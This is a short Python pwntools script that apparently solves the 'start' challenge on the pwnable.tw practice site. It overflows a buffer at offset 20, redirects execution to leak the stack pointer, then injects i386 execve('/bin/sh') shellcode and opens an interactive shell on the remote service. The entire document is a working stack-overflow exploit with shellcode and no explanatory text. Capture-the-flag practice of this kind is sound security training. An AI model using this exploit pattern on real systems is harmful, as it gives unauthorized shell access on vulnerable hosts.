#!/usr/bin/env python
# coding=utf-8

from pwn import *

#p = process('./start')
p = remote('chall.pwnable.tw', 10000)

p.recvuntil(':')

ret = 0x08048087
cyclic_offset = 20

p.send(fit({
    cyclic_offset: p32(ret)
    }))

esp = u32(p.recv(1024)[:4])
log.info("Esp: %s" % hex(esp))

p.send(fit({
    cyclic_offset: [p32(esp + 20), asm(shellcraft.i386.linux.execve('/bin/sh'))]
    }))

p.interactive()
